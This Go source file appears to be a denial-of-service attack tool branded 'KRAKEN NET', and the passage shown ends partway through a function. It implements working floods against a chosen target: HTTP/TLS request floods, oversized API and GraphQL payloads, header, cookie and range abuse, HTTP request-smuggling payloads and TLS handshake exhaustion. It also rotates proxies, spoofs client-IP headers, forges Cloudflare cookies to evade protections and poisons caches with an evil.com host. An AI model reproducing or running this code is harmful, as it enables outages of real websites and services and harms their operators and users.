package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	Reset    = "\033[0m"
	Red      = "\033[0;31m"
	RedLight = "\033[91m"
	Green    = "\033[32m"
	Yellow   = "\033[33m"
	Cyan     = "\033[36m"
	Magenta  = "\033[35m"
	White    = "\033[37m"
	Gray     = "\033[90m"
	BRed     = "\033[1;31m"
	BGreen   = "\033[1;32m"
	BYellow  = "\033[1;33m"
	BCyan    = "\033[1;36m"
	BWhite   = "\033[1;37m"
	Bold     = "\033[1m"
)

var (
	userAgents  []string
	referers    []string
	proxies     []string
	target      string
	connections int
	workers     int
	port        int
	durationSec int

	totalSuccess int64
	totalFail    int64
	totalBytes   int64
	totalReq     int64
	attackStart  time.Time

	lastReq      int64
	lastSnapshot time.Time
	currentRPS   float64
	rpsMu        sync.Mutex
)

var defaultUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"python-requests/2.31.0",
	"Go-http-client/2.0",
	"curl/7.88.1",
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
}

var defaultReferers = []string{
	"https://www.google.com/",
	"https://www.google.com/search?q=",
	"https://www.bing.com/",
	"https://duckduckgo.com/",
	"https://www.facebook.com/",
	"https://t.co/",
	"https://www.reddit.com/",
	"https://github.com/",
	"https://news.ycombinator.com/",
	"https://www.youtube.com/",
}

var httpPaths = []string{
	"/", "/index.php", "/index.html", "/api", "/login", "/admin", "/wp-login.php",
	"/api/v1/users", "/search", "/.env", "/config.php", "/wp-admin/",
	"/api/v1/data", "/robots.txt", "/favicon.ico", "/static/",
	"/assets/", "/js/", "/css/", "/images/", "/uploads/",
	"/api/auth", "/api/token", "/graphql", "/rest/", "/v1/",
	"/api/v2/", "/health", "/status", "/metrics", "/debug/",
	"/.git/config", "/phpinfo.php", "/info.php", "/server-status",
	"/xmlrpc.php", "/wp-json/wp/v2/users", "/.well-known/security.txt",
	"/admin/config", "/administrator/", "/phpmyadmin/",
}

var apiEndpoints = []string{
	"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit",
	"/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook",
}

var postPayloads = []string{
	`{"username":"admin","password":"password"}`,
	`{"email":"test@test.com","message":"hello"}`,
	`{"data":"AAAAAAA","type":"test"}`,
	`{"action":"login","user":"admin","pass":"admin123"}`,
	strings.Repeat("A", 1024),
	strings.Repeat("B", 2048),
}

var discordPayloads = [][]byte{
	[]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffgetstatus xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffgetchallenge xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffrcon \"\" \"\"\x00\x00\x00"),
}

type bypassHeader struct {
	Key   string
	Value string
	Rand  bool
}

var bypassHeaders = []bypassHeader{
	{Key: "X-Forwarded-For", Value: "127.0.0.1", Rand: true},
	{Key: "CF-Connecting-IP", Value: "127.0.0.1", Rand: true},
	{Key: "X-Real-IP", Value: "127.0.0.1", Rand: true},
	{Key: "True-Client-IP", Value: "127.0.0.1", Rand: true},
	{Key: "X-Forwarded-Host", Value: "localhost"},
	{Key: "X-Host", Value: "localhost"},
	{Key: "X-Forwarded-Server", Value: "localhost"},
	{Key: "X-HTTP-Host-Override", Value: "localhost"},
	{Key: "Forwarded", Value: "for=127.0.0.1;by=127.0.0.1"},
	{Key: "X-Original-URL", Value: "/"},
	{Key: "X-Rewrite-URL", Value: "/"},
	{Key: "X-Forwarded-Proto", Value: "https"},
	{Key: "X-Forwarded-Port", Value: "443"},
	{Key: "X-Cluster-Client-IP", Value: "127.0.0.1", Rand: true},
	{Key: "X-Client-IP", Value: "127.0.0.1", Rand: true},
}

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func printBanner() {
	banner := `
              ...-%@@@@@@@-..               
             .:%@@@@@@@@@@@@%-.             
            .#@@@@@@@@@@@@@@@@#.            
           .%@@@@@@@@@@@@@@@@@@%.           
           :@@@@@@@@@@@@@@@@@@@@:           
 ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. 
:@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-
@#.  -@@@- :@@@@@@@@@@@@@@@@@@@@:.:@@@-  .#@
:-. .%@@@: .@@@@@@@@@@@@@@@@@@@@..:@@@%. .-:
   .*@@@=:@:.@@@@@@@@@@@@@@@@@@.:@:=@@@#.   
  .#@@@+ .#+.=@@@@@@@@@@@@@@@@=.+%..+@@@#.  
 .%@@@#..#@...##@@@@@@@@@@@@##. .%#..#@@@%. 
.*@@@@. *@*  -@@@@@@@@@@@@@@@@- .+@*..@@@@*.
-@@@@@. %@@:..*@.*@@@@@@@@*.%* .:@@@..@@@@@-
=@@@@@: %@@@@@#@@@@@@@@@@@@@@%@@@@@%.:@@@@@+
=@@@@@@=.+@%+%@@@@@@@@@@@@@@@@@=%@+.=@@@@@@=
.@@@@@@@@@@@@+@@@@@@@@@@@@@@@@+@@@@@@@@@@@@.
 .*@@@@==*@@#@@%#@@@@@@@@@@#%@@#@@#=-@@@@*..
 .:#@@@@@+@@-@=%@@@@@@@@@@@@%=@-@@+@@@@@#:..
:@@@@@@@@=@@:#@@@@@@@##@@@@@@@%.@@=@@@@@@@@:
#@@@@@-:.*-@@@@@@@@@- .-@@@@@@@@@-*.:-@@@@@#
#@@@@@@@%-@@@@@@@%... ....%@@@@@@@-%@@@@@@@#
:@@@@@@@-%@@@@@:  =@@::@@=  :@@@@@%:@@@@@@@:
 .-@@@@@:@@@@@-    .@%%@.    -@@@@@:@@@@@-..
         #@@@@#....*@..@#....#@@@@#.        
         .%@@@@@@@@@+ .+@@@@@@@@@%.         
          .:@@@@@@+.   ..+@@@@@@:.          
`
	fmt.Println(RedLight + banner + Reset)
	fmt.Println()
	fmt.Println("   " + BCyan + "K R A K E N   N E T" + Reset + "   " + BWhite + "v5.0 REBORN" + Reset)
	fmt.Println("   " + Gray + "Layer 7 Full Spectrum | by Piwiii2.0" + Reset)
	fmt.Println()
}

func mhead(title string, color string) {
	d := 43 - len(title)
	if d < 0 {
		d = 0
	}
	fmt.Println(color + "┌─ " + title + " " + strings.Repeat("─", d) + "┐" + Reset)
}

func mrow(name string, desc string) {
	p1 := 14 - len(name)
	p2 := 31 - len(desc)
	if p1 < 0 {
		p1 = 0
	}
	if p2 < 0 {
		p2 = 0
	}
	fmt.Println("│ " + BWhite + name + Reset + strings.Repeat(" ", p1) + desc + strings.Repeat(" ", p2) + "│")
}

func mfoot(color string) {
	fmt.Println(color + "└" + strings.Repeat("─", 46) + "┘" + Reset)
}

func printMenu() {
	fmt.Println()
	mhead("TLS / HTTP", Cyan)
	mrow("kraken", "TLS multi-request flood")
	mrow("tls", "Standard TLS flood")
	mrow("http-flood", "HTTP GET/POST flood")
	mrow("https-flood", "HTTPS TLS flood")
	mrow("api-flood", "JSON API heavy payloads")
	mrow("header-flood", "Massive header flood")
	mrow("mixpost", "Mixed content-type POST")
	mrow("cf-bypass", "Browser-like CF bypass")
	mrow("range", "Range header abuse")
	mrow("cookie-bomb", "500 cookies per request")
	mrow("cache-poison", "Cache poisoning probe flood")
	mrow("gzip-bomb", "Compressed body amplification")
	mfoot(Cyan)
	fmt.Println()
	mhead("ADVANCED LAYER 7", Yellow)
	mrow("slowloris", "Slow HTTP headers hold")
	mrow("rudy", "R.U.D.Y slow POST body")
	mrow("rapid-reset", "HTTP/2 Rapid Reset")
	mrow("h2-cont", "HTTP/2 CONTINUATION")
	mrow("chunk-post", "Chunked drip POST")
	mrow("ws-flood", "WebSocket message flood")
	mrow("malformed", "Malformed long URL")
	mrow("http-smuggle", "CL.TE / TE.CL desync probes")
	mrow("tls-exhaust", "TLS handshake CPU drain")
	mrow("graphql-bomb", "Deeply nested GraphQL DoS")
	mfoot(Yellow)
	fmt.Println()
	mhead("UDP", Magenta)
	mrow("udp-discord", "Quake3 query flood")
	mrow("udp-bypass", "Random payload flood")
	mrow("udp-gbps", "High bandwidth flood")
	mrow("quic-flood", "QUIC initial packet flood")
	mrow("fivem", "FiveM getinfo flood")
	mfoot(Magenta)
	fmt.Println()
	mhead("GAME", Green)
	mrow("minecraft", "Minecraft handshake flood")
	mfoot(Green)
	fmt.Println()
	mhead("ULTIMATE", RedLight)
	mrow("hybrid", "TLS + API + WS + H2 reset")
	mrow("apocalypse", "All vectors maximum")
	mfoot(RedLight)
	fmt.Println()
}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, defaultUserAgents[rand.Intn(len(defaultUserAgents))])
}

func randomReferer() string {
	return randomFromList(referers, defaultReferers[rand.Intn(len(defaultReferers))])
}

func randomMethod() string {
	switch rand.Intn(10) {
	case 0, 1:
		return "POST"
	case 2:
		return "HEAD"
	case 3:
		return "PUT"
	default:
		return "GET"
	}
}

func randomPath() string {
	if rand.Intn(2) == 0 {
		return httpPaths[rand.Intn(len(httpPaths))]
	}
	b := make([]byte, rand.Intn(20)+5)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return "/" + string(b)
}

func randomPostPayload() string {
	return postPayloads[rand.Intn(len(postPayloads))]
}

func randomBypassHeader() (string, string) {
	h := bypassHeaders[rand.Intn(len(bypassHeaders))]
	if h.Rand && rand.Intn(2) == 0 {
		return h.Key, randomIP()
	}
	return h.Key, h.Value
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(254)+1)
}

func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randEmail() string {
	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
	return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
}

func formatBytes(b float64) string {
	units := []string{"B", "KB", "MB", "GB", "TB"}
	i := 0
	for b >= 1024 && i < len(units)-1 {
		b /= 1024
		i++
	}
	return fmt.Sprintf("%.2f %s", b, units[i])
}

func formatDuration(d time.Duration) string {
	m := int(d.Minutes())
	s := int(d.Seconds()) % 60
	return fmt.Sprintf("%02dm:%02ds", m, s)
}

func parseTarget(targetURL string) (string, string, string, string) {
	u, err := url.Parse(targetURL)
	if err != nil || u.Host == "" {
		return "https", targetURL, "443", "/"
	}
	scheme := u.Scheme
	host := u.Hostname()
	p := u.Port()
	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	if p == "" {
		if scheme == "https" {
			p = "443"
		} else {
			p = "80"
		}
	}
	return scheme, host, p, path
}

func dialTarget(host, p string) (net.Conn, error) {
	addr := net.JoinHostPort(host, p)
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		pURL, err := url.Parse(px)
		if err != nil {
			return nil, err
		}
		rawConn, err := net.DialTimeout("tcp", pURL.Host, 5*time.Second)
		if err != nil {
			return nil, err
		}
		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if pURL.User != nil {
			user := pURL.User.Username()
			pass, _ := pURL.User.Password()
			cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
		}
		connectReq += "\r\n"
		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
			rawConn.Close()
			return nil, err
		}
		br := bufio.NewReader(rawConn)
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			rawConn.Close()
			return nil, err
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			rawConn.Close()
			return nil, fmt.Errorf("proxy connect failed: %d", resp.StatusCode)
		}
		return rawConn, nil
	}
	return net.DialTimeout("tcp", addr, 5*time.Second)
}

func newHTTPClientTLSWithProxy(proxyStr string, conns int) *http.Client {
	var proxyURL *url.URL
	if proxyStr != "" {
		proxyURL, _ = url.Parse(proxyStr)
	}
	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        conns * 4,
		MaxIdleConnsPerHost: conns * 4,
		MaxConnsPerHost:     conns * 4,
		IdleConnTimeout:     30 * time.Second,
		DisableCompression:  true,
		ForceAttemptHTTP2:   true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
			MinVersion:         tls.VersionTLS12,
		},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func newNoTimeoutClient() *http.Client {
	base := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
	c := *base
	c.Timeout = 0
	if t, ok := base.Transport.(*http.Transport); ok {
		tc := t.Clone()
		tc.ResponseHeaderTimeout = 0
		tc.IdleConnTimeout = 0
		c.Transport = tc
	}
	return &c
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	method := randomMethod()
	path := randomPath()
	var body io.Reader
	if method == "POST" || method == "PUT" || method == "PATCH" {
		body = strings.NewReader(randomPostPayload())
	}
	req, err := http.NewRequest(method, baseURL+path, body)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	hk, hv := randomBypassHeader()
	req.Header.Set(hk, hv)
	req.Header.Set("Cookie", "session="+randString(32)+"; _ga="+randString(12))
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func genFormPayload() (string, string) {
	payloads := []func() string{
		func() string {
			return "username=" + randString(8+rand.Intn(16)) +
				"&password=" + randString(12+rand.Intn(20)) +
				"&email=" + randEmail() +
				"&csrf_token=" + randString(32)
		},
		func() string {
			return "search=" + randString(20+rand.Intn(200)) +
				"&category=" + randString(5) +
				"&page=" + strconv.Itoa(rand.Intn(500)) +
				"&submit=Search"
		},
		func() string {
			return "name=" + randString(10) +
				"&email=" + randEmail() +
				"&subject=" + randString(20+rand.Intn(40)) +
				"&message=" + randString(200+rand.Intn(2000)) +
				"&token=" + randString(64)
		},
		func() string {
			var sb strings.Builder
			n := 50 + rand.Intn(200)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte('&')
				}
				sb.WriteString(randString(3 + rand.Intn(8)))
				sb.WriteByte('=')
				sb.WriteString(randString(5 + rand.Intn(30)))
			}
			return sb.String()
		},
		func() string {
			size := 10240 + rand.Intn(40960)
			blob := make([]byte, size)
			rand.Read(blob)
			return "data=" + base64.StdEncoding.EncodeToString(blob)
		},
	}
	if rand.Intn(4) == 0 {
		jsonStr := fmt.Sprintf(
			`{"email":"%s","password":"%s","action":"login","token":"%s","data":"%s"}`,
			randEmail(), randString(16+rand.Intn(32)), randString(64), randString(200+rand.Intn(1000)),
		)
		return jsonStr, "application/json"
	}
	return payloads[rand.Intn(len(payloads))](), "application/x-www-form-urlencoded"
}

func genAPIPayload() string {
	generators := []func() string{
		func() string {
			bioLen := 2000 + rand.Intn(8000)
			return fmt.Sprintf(
				`{"user_id":"%d","action":"update_profile","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
				rand.Intn(9999999), randString(bioLen), randString(32), randEmail(), randString(12+rand.Intn(20)),
			)
		},
		func() string {
			var sb strings.Builder
			n := 500 + rand.Intn(4500)
			sb.WriteString(`{"action":"bulk_insert","token":"`)
			sb.WriteString(randString(64))
			sb.WriteString(`","items":[`)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
					rand.Intn(9999999), randString(8+rand.Intn(16)), randString(20+rand.Intn(100)))
			}
			sb.WriteString(`]}`)
			return sb.String()
		},
		func() string {
			depth := 20 + rand.Intn(30)
			var sb strings.Builder
			for i := 0; i < depth; i++ {
				fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.Intn(200)))
			}
			sb.WriteString(`{"end":true}`)
			for i := 0; i < depth; i++ {
				sb.WriteString(`}}`)
			}
			return sb.String()
		},
		func() string {
			return fmt.Sprintf(
				`{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","data":"%s"}}}}`,
				rand.Intn(9999999), randString(16), randString(3000+rand.Intn(5000)),
				randString(8), randString(5), randString(1000+rand.Intn(4000)),
			)
		},
		func() string {
			return fmt.Sprintf(
				`{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
				randEmail(), randString(16+rand.Intn(32)), rand.Intn(999999), randString(36), randString(64),
			)
		},
	}
	return generators[rand.Intn(len(generators))]()
}

func apiFloodRequest(client *http.Client, targetURL string) bool {
	body := genAPIPayload()
	fullURL := targetURL + apiEndpoints[rand.Intn(len(apiEndpoints))]
	req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Request-ID", randString(32))
	req.Header.Set("Authorization", "Bearer "+randString(64))
	req.Header.Set("Origin", targetURL)
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(body)))
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func headerFloodRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	n := 50 + rand.Intn(50)
	for i := 0; i < n; i++ {
		req.Header.Set("X-"+randString(8), randString(1024))
	}
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func mixPostRequest(client *http.Client, targetURL string) bool {
	var body string
	var contentType string
	switch rand.Intn(4) {
	case 0:
		contentType = "application/json"
		body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), rand.Intn(9999), randString(32))
	case 1:
		contentType = "application/xml"
		body = fmt.Sprintf(`<root><data>%s</data><id>%d</id></root>`, randString(500), rand.Intn(9999))
	case 2:
		contentType = "application/x-www-form-urlencoded"
		body = "data=" + randString(500) + "&id=" + strconv.Itoa(rand.Intn(9999))
	case 3:
		contentType = "text/plain"
		body = randString(500)
	}
	req, err := http.NewRequest("POST", targetURL+randomPath(), strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(body)))
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func cfBypassRequest(client *http.Client, targetURL string) bool {
	sep := "?"
	if strings.Contains(targetURL, "?") {
		sep = "&"
	}
	fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.Intn(9999))
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Cookie", "cf_clearance="+randString(43)+"; __cf_bm="+randString(36))
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func rangeRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	var ranges []string
	for i := 0; i < 100; i++ {
		ranges = append(ranges, fmt.Sprintf("0-%d", i*1000))
	}
	req.Header.Set("Range", "bytes="+strings.Join(ranges, ","))
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func cookieBombRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	var cookies strings.Builder
	for i := 0; i < 500; i++ {
		cookies.WriteString("c" + strconv.Itoa(i) + "=" + randString(100) + "; ")
	}
	req.Header.Set("Cookie", cookies.String())
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func cachePoisonRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("X-Forwarded-Host", randString(12)+".evil.com")
	req.Header.Set("X-Forwarded-Scheme", "nothttps")
	req.Header.Set("X-Rewrite-URL", "/"+randString(16))
	req.Header.Set("X-Original-URL", "/admin/"+randString(8))
	req.Header.Set("Host", randomIP())
	req.Header.Set("Cache-Control", "no-transform")
	req.Header.Set("Pragma", "akamai-x-cache-on")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func gzipBombRequest(client *http.Client, targetURL string) bool {
	rawData := randString(1024 * 512)
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write([]byte(rawData))
	gz.Close()
	compressed := buf.Bytes()

	req, err := http.NewRequest("POST", targetURL+randomPath(), bytes.NewReader(compressed))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Encoding", "gzip")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.ContentLength = int64(len(compressed))
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(compressed)))
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func graphqlBombRequest(client *http.Client, targetURL string) bool {
	depth := 30 + rand.Intn(20)
	var sb strings.Builder
	sb.WriteString(`{"query":"{ `)
	fieldName := "user"
	for i := 0; i < depth; i++ {
		sb.WriteString(fieldName)
		sb.WriteString("(id: ")
		sb.WriteString(strconv.Itoa(rand.Intn(9999)))
		sb.WriteString(`) { id name posts { id title comments { id body author { id name `)
	}
	sb.WriteString("id")
	for i := 0; i < depth; i++ {
		sb.WriteString(` } } } }`)
	}
	sb.WriteString(` }","variables":{}}`)
	body := sb.String()

	endpoints := []string{"/graphql", "/api/graphql", "/query", "/gql", "/v1/graphql"}
	ep := endpoints[rand.Intn(len(endpoints))]
	req, err := http.NewRequest("POST", targetURL+ep, strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Request-ID", randString(32))
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(body)))
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func httpSmuggleOnce(targetURL string) bool {
	scheme, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return false
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return false
		}
		conn = tlsConn
	}
	defer conn.Close()

	variant := rand.Intn(3)
	var payload string

	switch variant {
	case 0:
		clteBody := "POST / HTTP/1.1\r\n" +
			"Host: " + host + "\r\n" +
			"Content-Length: 6\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"User-Agent: " + randomUserAgent() + "\r\n\r\n" +
			"0\r\n\r\n" +
			"GPOST"
		payload = clteBody
	case 1:
		teclBody := "POST / HTTP/1.1\r\n" +
			"Host: " + host + "\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding : chunked\r\n" +
			"User-Agent: " + randomUserAgent() + "\r\n\r\n" +
			"12\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"0\r\n\r\n"
		payload = teclBody
	case 2:
		obfuscated := "POST / HTTP/1.1\r\n" +
			"Host: " + host + "\r\n" +
			"Content-Length: 11\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"Transfer-encoding: cow\r\n" +
			"User-Agent: " + randomUserAgent() + "\r\n\r\n" +
			"b\r\n" +
			"SMUGGLED\r\n\r\n" +
			"0\r\n\r\n"
		payload = obfuscated
	}

	conn.SetDeadline(time.Now().Add(5 * time.Second))
	conn.Write([]byte(payload))
	buf := make([]byte, 4096)
	conn.Read(buf)
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalBytes, int64(len(payload)))
	return true
}

func tlsExhaustOnce(host, p string) bool {
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return false
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
		MinVersion:         tls.VersionTLS12,
		CipherSuites: []uint16{
